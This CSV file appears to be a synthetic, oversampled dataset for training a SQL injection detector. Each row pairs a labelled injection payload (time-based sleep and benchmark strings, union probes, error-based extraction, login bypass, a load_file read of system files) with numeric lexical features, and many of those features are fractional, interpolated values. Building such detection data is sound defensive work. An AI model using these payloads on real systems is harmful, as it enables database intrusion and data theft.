id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000496,attack,boolean,"1'||  (  select 'zifu' from dual where 4822  =  4822 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002053,1.0595161990120627,166.94738567474343,34.33917936947295,4.227553982841639,82.62574441368935,18.0,42.3216412610541,24.0,0.4947332396044573,0.10788991808018335,0.25352361820844826,0.14385322410691112,3.0,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,5.0,4.0,7.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,2.0,0.0,1.0,1.6608206305270499,0.33917936947295,0.6608206305270499,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.66082063052705
SMOTE_000497,attack,other,"1""   )    )    as xxdm where 4818  =  4818",nearest_attack_euclidean,R001343,0.006999697778632972,42.0,16.0,3.1078319552264637,11.0,9.0,18.0,4.0,0.2619047619047619,0.21428571428571427,0.42857142857142855,0.09523809523809523,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,0.0,0.9999999999999996,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000498,attack,time,"1%"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R006673,0.9436129905730036,26.700971081114574,19.40194216222915,4.154159357888478,12.0,4.0,3.0,7.7009710811145755,0.4495560498954773,0.1498520166318258,0.11238901247386934,0.2882029209988275,2.2990289188854245,0.7009710811145753,2.0,0.0,0.0,0.0,0.0,0.0,0.7009710811145753,0.0,0.0,2.0,1.0,0.7009710811145753,1.0,0.0,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000499,attack,union,"1%'   )    )     )   union all select null,null,null,null#",nearest_attack_euclidean,R000918,0.07461425094071625,56.78976096686188,17.0,3.2544351205130484,29.515904386744747,1.0,17.51590438674475,8.757952193372375,0.5201974229257684,0.01767609160673067,0.30808432364500066,0.15404216182250033,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8789760966861877,0.9999999999999999,0.0,2.8789760966861873,0.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000500,attack,boolean,"1   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006551,0.05766118430111675,103.02726943547688,27.027269435476885,3.448130794665597,31.0,13.0,45.0,14.027269435476885,0.30089195738426217,0.12618049825791638,0.43677864781586445,0.13614889654195694,0.02726943547688543,0.0,2.0,0.0,1.0,1.0,0.0,8.0,0.0,1.0,1.0,4.0,0.02726943547688543,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000501,attack,boolean," select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000531,0.06341949184927062,65.0,22.824602415883582,3.5328792265456803,26.0,5.175397584116418,24.0,9.824602415883582,0.4,0.07962150129409876,0.36923076923076925,0.15114772947513203,0.0,1.0,2.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,1.0,1.0,1.0000000000000002,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000502,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'stea'  =  'stea,nearest_attack_euclidean,R004822,0.6013603385446739,98.21257677970387,21.304601222120848,3.003448681505938,33.56319022303321,1.0,48.95398777879151,14.69539877787915,0.3410541876839496,0.010270070500033479,0.4982082281051715,0.15046751371084544,3.0,0.0,0.0,0.0,1.0,1.0,0.0,9.390797555758303,0.30460122212084906,0.0,0.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000503,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R005816,0.16034252444227975,75.0593955963825,21.79406044036175,3.4386038272170554,22.0,10.0,31.647516477106002,11.4118791192765,0.29389227543812263,0.13358739792641938,0.42061178988896897,0.15190853674648902,0.0,4.0,0.0,0.0,0.0,2.0,0.0,4.411879119276501,0.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000504,attack,time,"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R008951,0.42091145025937965,108.824943154813,31.47482946443898,3.7931455072644056,27.0,29.0,42.0,10.824943154812992,0.2481079285440069,0.2664862936213408,0.38594566662401075,0.09946011121064163,0.0,0.824943154812993,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,0.0,0.8249431548129931,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000505,attack,other,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",nearest_attack_euclidean,R002165,0.26691300883559016,162.8501469285909,31.92507346429545,3.7866819379845205,57.299706142818195,16.0,62.625367321477256,26.92507346429545,0.351880262407106,0.09825087258097571,0.3845358997408667,0.16533296527105149,0.9250734642954513,0.0,0.14985307140909732,0.0,0.0,0.0,0.0,14.925073464295451,0.0,2.0,4.0,5.074926535704549,0.9250734642954515,0.0,0.07492653570454877,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000506,attack,boolean,"-4615'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'jipk' like 'jipk",nearest_attack_euclidean,R008541,0.16275176274513087,94.19091892854405,25.719091892854404,3.3589143846231178,20.0,16.0,43.752735142835235,14.438183785708809,0.21284294601601128,0.17027435681280903,0.46370814529470217,0.15317455187647752,4.0,0.0,1.0,0.0,0.0,1.0,0.0,7.438183785708809,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000507,attack,other,"select * from generate_series  (  5846,5846,case when   (  5846  =  5227  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R003506,4.5668517161305734e-05,110.0,32.0,4.124610826958107,48.0,19.0,32.0,11.0,0.43636363636363634,0.17272727272727273,0.2909090909090909,0.1,0.0,0.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,1.0,2.0,4.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000508,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R001230,0.03839922936988358,85.52226798384103,27.0,3.443409043618753,16.0,21.0,37.60188998653419,10.92037799730684,0.1872475977778981,0.24576247208349125,0.43933317967567276,0.1276567504629379,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.920377997306838,0.0,0.0,1.0,0.9999999999999996,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000509,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R007678,0.25080496282750503,67.05203329845057,25.146573807032183,3.482549575585749,18.56027857890345,11.172590456257467,28.8794428421931,8.439721421096548,0.2791488753569939,0.16469290100725018,0.43071214262627766,0.12544608100947832,1.0,0.0,2.0,0.0,0.0,1.1465738070321831,0.0,4.146573807032183,0.0,0.0,0.14657380703218337,3.1465738070321834,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000510,attack,other,"1""  )   as vqkz where 8536  =  8536",nearest_attack_euclidean,R004832,8.429369702178807e-08,35.0,19.0,3.614438730983427,11.0,9.0,12.0,3.0,0.3142857142857143,0.2571428571428571,0.34285714285714286,0.08571428571428572,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9999999999999996,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000511,attack,boolean,"1%""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R003033,0.04902080550088532,146.13609518676088,30.0,3.938285763991189,74.0,8.0,44.3088761494087,19.827219037352172,0.5065757463717014,0.05476494555369746,0.3030081191001956,0.1356511889744055,0.0,4.0,0.0,0.0,1.0,2.0,0.0,5.827219037352174,2.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000512,attack,other,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",nearest_attack_euclidean,R000035,6.77402901065398,74.31881434788033,24.0,3.7824858965371586,12.0,25.768573295953672,18.16595440394981,18.384286647976836,0.16791089625831357,0.34511905012897,0.23745136776317102,0.2495186858495454,0.0,0.0,0.0,0.0,0.0,0.0,1.3973811079961396,4.192143323988418,0.0,1.0,9.986905539980699,0.0,0.0,0.0,0.0,0.0,2.168404344971009e-19,0.0,1.0,0.9999999999999999,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000513,attack,boolean,"1""  )   as vcir where 6275  =  6275 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002347,0.05167554909346716,209.79246326411385,33.84905790801423,3.7941896730765707,63.09434744808538,33.0,81.69811581602846,32.0,0.30066046418982395,0.1573284316364542,0.3894502007686753,0.15256090340504652,0.0,1.0,2.0,0.0,0.0,2.0,0.0,17.0,0.0,1.0,3.0,10.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000514,attack,time,1%'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R008417,0.14910360211762674,103.83955984486012,27.20439553831779,3.1815341120094085,22.817582153271168,10.204395538317792,53.54505476884744,17.27252738442372,0.21894840120434234,0.09822562292596242,0.5164233861259199,0.16640258974377545,4.0,0.0,0.0,0.0,0.0681318461059304,2.0,0.0,8.13626369221186,2.0,1.0,0.0681318461059306,2.0681318461059304,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000515,attack,other,1'||  (  select 'sbft' where 8748  =  8748,nearest_attack_euclidean,R003167,0.009781539588524674,42.0,19.0,3.7495297855478213,15.0,9.0,11.0,7.0,0.35714285714285715,0.21428571428571427,0.2619047619047619,0.16666666666666666,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000516,attack,other,1' rlike   (  select   (  case when   (  5384  =  7060  )   then 1 else 0x28 end   )    ) ,nearest_attack_euclidean,R006649,1.355171764143297,101.96343890072572,28.996953241727145,3.577624508474398,37.48019607122644,13.0,42.48628958777215,8.996953241727145,0.3651414269481366,0.1292860910614586,0.4172666066931692,0.08830587529723559,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.498476620863572,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,0.49847662086357203,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,3.0
SMOTE_000517,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R003089,0.02224552522715137,99.0,28.0,3.7306012447307633,26.0,22.0,38.0,13.0,0.26262626262626265,0.2222222222222222,0.3838383838383838,0.13131313131313133,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000518,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R008137,0.589688380505654,170.76569929288095,27.765699292880967,3.47667137249146,43.76569929288097,32.0,73.0,22.0,0.2562863367800441,0.187392419079044,0.4274889560240691,0.12883228811684275,1.0,0.0,0.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,4.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,3.0,0.0,0.0,1.0,0.7656992928809663,0.2343007071190337,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000519,attack,time,"1%'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R005350,0.26894586863759556,88.79819186017616,19.0,2.8592401236091822,14.0,10.0,47.95145212014508,16.84673974003109,0.16385773813470278,0.11704124152478769,0.5288608742787698,0.19024014606173972,4.0,0.0,0.0,0.0,0.0,2.0,0.0,7.846739740031088,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000520,attack,error,1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'ixzr'  =  'ixzr,nearest_attack_euclidean,R003028,0.1274875394631041,417.0970482896042,35.19409657920831,3.5410148935510963,112.38819315841663,51.0,182.80590342079168,70.90295171039584,0.2694514654608795,0.12227376302152644,0.4382826861351449,0.1699920853824491,4.0,0.0,0.0,0.0,0.0,2.902951710395843,0.0,38.0,0.0,0.0,0.0,28.902951710395847,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,2.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000521,attack,other,"1%""",nearest_attack_euclidean,R002900,1.9411578951899273,3.0,2.5552750717998762,1.2884792152544082,0.0,1.0,7.105427357601002e-15,2.0,0.0,0.3333333333333333,0.0,0.6666666666666666,0.0,0.5552750717998786,0.0,0.0,0.0,0.0,0.0,0.0,0.5552750717998786,0.0,0.0,0.8894498564002427,0.0,0.5552750717998785,0.0,0.0,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.4447249282001214,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.440892098500626e-16
SMOTE_000522,attack,other,"admin"" --",nearest_attack_euclidean,R009032,0.8888071642067734,11.314845903796225,8.771615301265406,3.040442722096322,6.028820401687206,0.0,1.5144102008436064,3.7716153012654043,0.5412663833099,0.0,0.12540028335676678,0.3333333333333333,0.2572051004218018,0.7427948995781983,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5144102008436033,2.0,0.2572051004218017,0.7427948995781983,1.0,0.0,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.440892098500626e-16
SMOTE_000523,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""vcvb"" like ""vcvb",nearest_attack_euclidean,R002366,0.5403826546761281,90.63398489180386,27.364002324337868,3.844276130054265,34.271995351324264,15.0,31.543990702648536,9.817998837831066,0.37837447533064805,0.16606051433104058,0.34713301531139595,0.10843199502691539,0.0,3.0,0.0,0.0,0.0,0.18200116216893325,0.0,5.635997675662133,0.0,0.0,1.0,0.18200116216893303,0.0,1.0,0.0,0.0,2.168404344971009e-19,0.18200116216893336,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000524,attack,other,"1',  (  select   (  case when   (  1392  =  1380  )   then 1 else 1392*  (  select 1392 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R001618,0.8706712751058376,127.86643420556985,27.94362550683541,3.767523101179798,50.64093623291148,18.943625506835406,44.753685219240666,13.528187246582295,0.39607527089644357,0.14893610473761487,0.34911425578545247,0.10587436858048907,1.0,0.0,0.0,0.0,1.0,1.0,0.0,7.056374493164592,0.0,0.4718127534177042,1.9436255068354082,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.5281872465822959,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.528187246582296
SMOTE_000525,attack,boolean,"1%""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,nearest_attack_euclidean,R005590,0.21011774835999472,363.7335698398205,34.68573962569506,3.538366070210029,93.12382641713003,45.0,160.36209058843042,65.24765283426008,0.25629435045165205,0.123899405089937,0.440369277241382,0.179436967217029,0.0,4.0,0.0,0.0,0.0,3.0,0.0,32.24765283426007,2.0,3.0,0.0,23.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
